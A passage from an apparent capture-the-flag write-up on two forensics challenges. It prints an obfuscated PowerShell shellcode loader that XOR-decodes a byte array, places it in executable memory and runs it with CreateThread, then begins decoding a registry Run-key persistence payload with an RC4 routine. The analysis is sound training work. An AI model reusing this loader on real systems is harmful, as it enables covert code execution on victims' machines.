style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>xf1,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>xde,<span style="color:#ae81ff">0</span>x66,<span style="color:#ae81ff">0</span>x9b,<span style="color:#ae81ff">0</span>x9b,<span style="color:#ae81ff">0</span>x9c,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>xa3,<span style="color:#ae81ff">0</span>x81,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x11,<span style="color:#ae81ff">0</span>x7d,<span style="color:#ae81ff">0</span>xed,<span style="color:#ae81ff">0</span>xb0,<span style="color:#ae81ff">0</span>xad,<span style="color:#ae81ff">0</span>xd3,<span style="color:#ae81ff">0</span>xfd,<span style="color:#ae81ff">0</span>xf1,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x10,<span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>xdc,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x10,<span style="color:#ae81ff">0</span>x33,<span style="color:#ae81ff">0</span>x3c,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>xf1,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x80,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x93,<span style="color:#ae81ff">0</span>xed,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xb7,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>xa9,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>xda,<span style="color:#ae81ff">0</span>xd3,<span style="color:#ae81ff">0</span>xde,<span style="color:#ae81ff">0</span>x54,<span style="color:#ae81ff">0</span>xa3,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x51,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x54,<span style="color:#ae81ff">0</span>x11,<span style="color:#ae81ff">0</span>xa5,<span style="color:#ae81ff">0</span>xb6,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x81,<span style="color:#ae81ff">0</span>x95,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x91,<span style="color:#ae81ff">0</span>xf1,<span style="color:#ae81ff">0</span>x98,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>x32,<span style="color:#ae81ff">0</span>x87,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>x9c,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>xe5,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x07,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x11,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x10,<span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>xdc,<span style="color:#ae81ff">0</span>x7d,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x10,<span style="color:#ae81ff">0</span>xe9,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xa4,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x9d,<span style="color:#ae81ff">0</span>xd2,<span style="color:#ae81ff">0</span>x9d,<span style="color:#ae81ff">0</span>xf5,<span style="color:#ae81ff">0</span>xd9,<span style="color:#ae81ff">0</span>x94,<span style="color:#ae81ff">0</span>xe8,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>xa4,<span style="color:#ae81ff">0</span>x09,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>x95,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x91,<span style="color:#ae81ff">0</span>xf5,<span style="color:#ae81ff">0</span>x98,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xb7,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>xdd,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x95,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x91,<span style="color:#ae81ff">0</span>xcd,<span style="color:#ae81ff">0</span>x98,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>x8f,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x3d,<span style="color:#ae81ff">0</span>xf1,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>xc3,<span style="color:#ae81ff">0</span>x38,<span style="color:#ae81ff">0</span>x9a,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x8c,<span style="color:#ae81ff">0</span>x98,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>xa6,<span style="color:#ae81ff">0</span>xa2,<span style="color:#ae81ff">0</span>xe3,<span style="color:#ae81ff">0</span>x8e,<span style="color:#ae81ff">0</span>xe2,<span style="color:#ae81ff">0</span>xe3,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x87,<span style="color:#ae81ff">0</span>x98,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x37,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x3d,<span style="color:#ae81ff">0</span>x71,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x98,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x34,<span style="color:#ae81ff">0</span>x98,<span style="color:#ae81ff">0</span>x6d,<span style="color:#ae81ff">0</span>xd3,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xd4,<span style="color:#ae81ff">0</span>xe8,<span style="color:#ae81ff">0</span>x11,<span style="color:#ae81ff">0</span>x79,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xc3,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x85,<span style="color:#ae81ff">0</span>x98,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x35,<span style="color:#ae81ff">0</span>x9d,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x6b,<span style="color:#ae81ff">0</span>x9d,<span style="color:#ae81ff">0</span>xa6,<span style="color:#ae81ff">0</span>xf7,<span style="color:#ae81ff">0</span>xd6,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x04,<span style="color:#ae81ff">0</span>x9d,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x3b,<span style="color:#ae81ff">0</span>xb9,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x6b,<span style="color:#ae81ff">0</span>xf8,<span style="color:#ae81ff">0</span>x51,<span style="color:#ae81ff">0</span>xba,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x04,<span style="color:#ae81ff">0</span>xbb,<span style="color:#ae81ff">0</span>xdb,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x8f,<span style="color:#ae81ff">0</span>x81,<span style="color:#ae81ff">0</span>x81,<span style="color:#ae81ff">0</span>x9c,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>x9c,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x11,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x11,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x13,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x11,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x10,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x6b,<span style="color:#ae81ff">0</span>x3b,<span style="color:#ae81ff">0</span>xde,<span style="color:#ae81ff">0</span>x0e,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x04,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x16,<span style="color:#ae81ff">0</span>xbb,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>x9d,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x33,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x28,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x6b,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x74,<span style="color:#ae81ff">0</span>xa5,<span style="color:#ae81ff">0</span>xb0,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x04,<span style="color:#ae81ff">0</span>x54,<span style="color:#ae81ff">0</span>x11,<span style="color:#ae81ff">0</span>xa5,<span style="color:#ae81ff">0</span>xdb,<span style="color:#ae81ff">0</span>x98,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x1f,<span style="color:#ae81ff">0</span>xa4,<span style="color:#ae81ff">0</span>x34,<span style="color:#ae81ff">0</span>x39,<span style="color:#ae81ff">0</span>x42,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x3d,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x33,<span style="color:#ae81ff">0</span>x9c,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>xbb,<span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x28,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x6b,<span style="color:#ae81ff">0</span>xd3,<span style="color:#ae81ff">0</span>x08,<span style="color:#ae81ff">0</span>x19,<span style="color:#ae81ff">0</span>x8e,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x04,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x29,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xaf,<span style="color:#ae81ff">0</span>x84,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x15,<span style="color:#ae81ff">0</span>xf1,<span style="color:#ae81ff">0</span>x8f,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x27,<span style="color:#ae81ff">0</span>xbb,<span style="color:#ae81ff">0</span>x91,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>xb9,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x23,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x6b,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>x75,<span style="color:#ae81ff">0</span>x82,<span style="color:#ae81ff">0</span>x34,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x04,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x12,<span style="color:#ae81ff">0</span>x98,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x16,<span style="color:#ae81ff">0</span>x9c,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>x98,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x21,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x0b,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x28,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x6b,<span style="color:#ae81ff">0</span>xd3,<span style="color:#ae81ff">0</span>x08,<span style="color:#ae81ff">0</span>x19,<span style="color:#ae81ff">0</span>x8e,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x04,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x29,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xac,<span style="color:#ae81ff">0</span>xf9,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x86,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>xb9,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x91,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>xbb,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x6b,<span style="color:#ae81ff">0</span>xda,<span style="color:#ae81ff">0</span>xfe,<span style="color:#ae81ff">0</span>xde,<span style="color:#ae81ff">0</span>xe1,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x04,<span style="color:#ae81ff">0</span>x86,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x6b,<span style="color:#ae81ff">0</span>xa4,<span style="color:#ae81ff">0</span>xbf,<span style="color:#ae81ff">0</span>x9c,<span style="color:#ae81ff">0</span>xb0,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x04,<span style="color:#ae81ff">0</span>x98,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x1f,<span style="color:#ae81ff">0</span>x38,<span style="color:#ae81ff">0</span>xed,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x12,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>xf8,<span style="color:#ae81ff">0</span>x17,<span style="color:#ae81ff">0</span>x99,<span style="color:#ae81ff">0</span>x54,<span style="color:#ae81ff">0</span>x27,<span style="color:#ae81ff">0</span>xa4,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x90,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x36,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>xbb,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>x98,<span style="color:#ae81ff">0</span>x16,<span style="color:#ae81ff">0</span>x13,<span style="color:#ae81ff">0</span>x21,<span style="color:#ae81ff">0</span>x64,<span style="color:#ae81ff">0</span>x73,<span style="color:#ae81ff">0</span>x87,<span style="color:#ae81ff">0</span>x2e,<span style="color:#ae81ff">0</span>x04;
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">[array]</span>::Reverse(<span style="color:#960050;background-color:#1e0010">$</span>stage2);
+
+<span style="color:#960050;background-color:#1e0010">$</span>hRffYLENA = <span style="color:#960050;background-color:#1e0010">$</span>tNZvQCljVk::VirtualAlloc(<span style="color:#ae81ff">0</span>,[Math]::Max(<span style="color:#960050;background-color:#1e0010">$</span>HVOASfFuNSxRXR.Length,<span style="color:#ae81ff">0</span>x1000),<span style="color:#ae81ff">0</span>x3000,<span style="color:#ae81ff">0</span>x40);
+
+<span style="color:#960050;background-color:#1e0010">$</span>stage3 = <span style="color:#960050;background-color:#1e0010">$</span>stage1 + <span style="color:#960050;background-color:#1e0010">$</span>stage2;
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">[System.Runtime.InteropServices.Marshal]</span>::Copy(<span style="color:#960050;background-color:#1e0010">$</span>HVOASfFuNSxRXR,<span style="color:#ae81ff">0</span>,<span style="color:#960050;background-color:#1e0010">$</span>hRffYLENA,<span style="color:#960050;background-color:#1e0010">$</span>HVOASfFuNSxRXR.Length);
+
+<span style="color:#960050;background-color:#1e0010">#</span> Unpack Shellcode;
+
+<span style="color:#66d9ef">for</span>(<span style="color:#960050;background-color:#1e0010">$</span>i=<span style="color:#ae81ff">0</span>; <span style="color:#960050;background-color:#1e0010">$</span>i -lt <span style="color:#960050;background-color:#1e0010">$</span>HVOASfFuNSxRXR.count ; <span style="color:#960050;background-color:#1e0010">$</span>i++)
+{
+    <span style="color:#960050;background-color:#1e0010">$</span>HVOASfFuNSxRXR[<span style="color:#960050;background-color:#1e0010">$</span>i] = <span style="color:#960050;background-color:#1e0010">$</span>HVOASfFuNSxRXR[<span style="color:#960050;background-color:#1e0010">$</span>i] -bxor <span style="color:#ae81ff">0</span>xd1;
+}
+
+<span style="color:#960050;background-color:#1e0010">#</span>Unpack Special Orders!
+
+<span style="color:#66d9ef">for</span>(<span style="color:#960050;background-color:#1e0010">$</span>i=<span style="color:#ae81ff">0</span>;<span style="color:#960050;background-color:#1e0010">$</span>i -lt <span style="color:#960050;background-color:#1e0010">$</span>stage3.count;<span style="color:#960050;background-color:#1e0010">$</span>i++){
+    <span style="color:#960050;background-color:#1e0010">$</span>stage3[<span style="color:#960050;background-color:#1e0010">$</span>i] = <span style="color:#960050;background-color:#1e0010">$</span>stage3[<span style="color:#960050;background-color:#1e0010">$</span>i] -bxor <span style="color:#ae81ff">0</span>xd1;
+}
+
+<span style="color:#960050;background-color:#1e0010">$</span>tNZvQCljVk::CreateThread(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#960050;background-color:#1e0010">$</span>hRffYLENA,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
+</code></pre></div><p>If we execute it, there is nothing printed and the powershell window is closing. I tried to print $stage3 (and I removed the last line to prevent the window closing), which is giving me the following output :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#960050;background-color:#1e0010">$</span> .<span style="color:#960050;background-color:#1e0010">\</span>script.ps1
+<span style="color:#ae81ff">72</span> <span style="color:#ae81ff">84</span> <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">123</span> <span style="color:#ae81ff">98</span> <span style="color:#ae81ff">51</span> <span style="color:#ae81ff">119</span> <span style="color:#ae81ff">104</span> <span style="color:#ae81ff">52</span> <span style="color:#ae81ff">114</span> <span style="color:#ae81ff">51</span> <span style="color:#ae81ff">95</span> <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">102</span> <span style="color:#ae81ff">95</span> <span style="color:#ae81ff">116</span> <span style="color:#ae81ff">104</span> <span style="color:#ae81ff">51</span> <span style="color:#ae81ff">95</span> <span style="color:#ae81ff">98</span> <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">116</span> <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">95</span> <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">102</span> <span style="color:#ae81ff">95</span> <span style="color:#ae81ff">106</span> <span style="color:#ae81ff">117</span> <span style="color:#ae81ff">115</span> <span style="color:#ae81ff">116</span> <span style="color:#ae81ff">49</span> <span style="color:#ae81ff">99</span> <span style="color:#ae81ff">51</span> <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">125</span>
+</code></pre></div><p>This looks like a decimal ASCII chain. After decoding it (decimal → ascii), I got the flag !</p>
+<p><img loading="lazy" src="https://luhko.github.io/cyber2022_data/Untitled.png" alt="Untitled"  />
+</p>
+<h2 id="golden-persistence">Golden Persistence<a hidden class="anchor" aria-hidden="true" href="#golden-persistence">#</a></h2>
+<p>We have a <code>NTUSER.DAT</code> file. This file is used as a hive file (<code>HKEY_CURRENT_USER</code>) in Windows systems. We can navigate in it with Registry Explorer.</p>
+<p>Regarding the challenge description, we know that it is about persistence. Usually, persistence stuff are located in <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code></p>
+<p>After navigating to the key, we can find the following value, which is highly suspicious :</p>
+<p><img loading="lazy" src="https://luhko.github.io/cyber2022_data/Untitled%201.png" alt="Untitled"  />
+</p>
+<p>We can use this <a href="https://raikia.com/tool-powershell-encoder/">tool</a> to decrypt the payload :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">function encr {
+    param(
+<span style="color:#a6e22e">        [Byte[]</span>]<span style="color:#960050;background-color:#1e0010">$</span>data,
+<span style="color:#a6e22e">        [Byte[]</span>]<span style="color:#960050;background-color:#1e0010">$</span>key
+      )
+<span style="color:#a6e22e"> 
+</span><span style="color:#a6e22e">    [Byte[]</span>]<span style="color:#960050;background-color:#1e0010">$</span>buffer = New-Object Byte[] <span style="color:#960050;background-color:#1e0010">$</span>data.Length
+    <span style="color:#960050;background-color:#1e0010">$</span>data.CopyTo(<span style="color:#960050;background-color:#1e0010">$</span>buffer, <span style="color:#ae81ff">0</span>)
+<span style="color:#a6e22e">    
+</span><span style="color:#a6e22e">    [Byte[]</span>]<span style="color:#960050;background-color:#1e0010">$</span>s = New-Object Byte[] <span style="color:#ae81ff">256</span>;
+<span style="color:#a6e22e">    [Byte[]</span>]<span style="color:#960050;background-color:#1e0010">$</span>k = New-Object Byte[] <span style="color:#ae81ff">256</span>;
+ 
+    <span style="color:#66d9ef">for</span> (<span style="color:#960050;background-color:#1e0010">$</span>i = <span style="color:#ae81ff">0</span>; <span style="color:#960050;background-color:#1e0010">$</span>i -lt <span style="color:#ae81ff">256</span>; <span style="color:#960050;background-color:#1e0010">$</span>i++)
+    {
+        <span style="color:#960050;background-color:#1e0010">$</span>s[<span style="color:#960050;background-color:#1e0010">$</span>i] = [Byte]<span style="color:#960050;background-color:#1e0010">$</span>i;
+        <span style="color:#960050;background-color:#1e0010">$</span>k[<span style="color:#960050;background-color:#1e0010">$</span>i] = <span style="color:#960050;background-color:#1e0010">$</span>key[<span style="color:#960050;background-color:#1e0010">$</span>i % <span style="color:#960050;background-color:#1e0010">$</span>key.Length];
+    }
+ 
+    <span style="color:#960050;background-color:#1e0010">$</span>j = <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">for</span> (<span style="color:#960050;background-color:#1e0010">$</span>i = <span style="color:#ae81ff">0</span>; <span style="color:#960050;background-color:#1e0010">$</span>i -lt <span style="color:#ae81ff">256</span>; <span style="color:#960050;background-color:#1e0010">$</span>i++)
+    {
+        <span style="color:#960050;background-color:#1e0010">$</span>j = (<span style="color:#960050;background-color:#1e0010">$</span>j + <span style="color:#960050;background-color:#1e0010">$</span>s[<span style="color:#960050;background-color:#1e0010">$</span>i] + <span style="color:#960050;background-color:#1e0010">$</span>k[<span style="color:#960050;background-color:#1e0010">$</span>i]) % <span style="color:#ae81ff">256</span>;
+        <span style="color:#960050;background-color:#1e0010">$</span>temp = <span style="color:#960050;background-color:#1e0010">$</span>s[<span style="color:#960050;background-color:#1e0010">$</span>i];
+        <span style="color:#960050;background-color:#1e0010">$</span>s[<span style="color:#960050;background-color:#1e0010">$</span>i] = <span style="color:#960050;background-color:#1e0010">$</span>s[<span style="color:#960050;background-color:#1e0010">$</span>j];
+        <span style="color:#960050;background-color:#1e0010">$</span>s[<span style="color:#960050;background-color:#1e0010">$</span>j] = <span style="color:#960050;background-color:#1e0010">$</span>temp;
+    }
+ 
+    <span style="color:#960050;background-color:#1e0010">$</span>i = <span style="color:#960050;background-color:#1e0010">$</span>j = <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">for</span> (<span style="color:#960050;background-color:#1e0010">$</span>x = <span style="color:#ae81ff">0</span>; <span style="color:#960050;background-color:#1e0010">$</span>x -lt <span style="color:#960050;background-color:#1e0010">$</span>buffer.Length; <span style="color:#960050;background-color:#1e0010">$</span>x++)
+    {
+        <span style="color:#960050;background-color:#1e0010">$</span>i = (<span style="color:#960050;background-color:#1e0010">$</span>i + <span style="color:#ae81ff">1</span>) % <span style="color:#ae81ff">256</span>;
+        <span style="color:#960050;background-color:#1e0010">$</span>j = (<span style="color:#960050;background-color:#1e0010">$</span>j + <span style="color:#960050;background-color:#1e0010">$</span>s[<span style="color:#960050;background-color:#1e0010">$</span>i]) % <span style="color:#ae81ff">256</span>;
+        <span style="color:#960050;background-color:#1e0010">$</span>temp = <span style="color:#960050;background-color:#1e0010">$</span>s[<span style="color:#960050;background-color:#1e0010">$</span>i];
+        <span style="color:#960050;background-color:#1e0010">$</span>s[<span style="color:#960050;background-color:#1e0010">$</span>i] = <span style="color:#960050;background-color:#1e0010">$</span>s[<span style="color:#960050;background-color:#1e0010">$</span>j];
+        <span style="color:#960050;background-color:#1e0010">$</span>s[<span style="color:#960050;background-color:#1e0010">$</span>j] = <span style="color:#960050;background-color:#1e0010">$</span>temp;
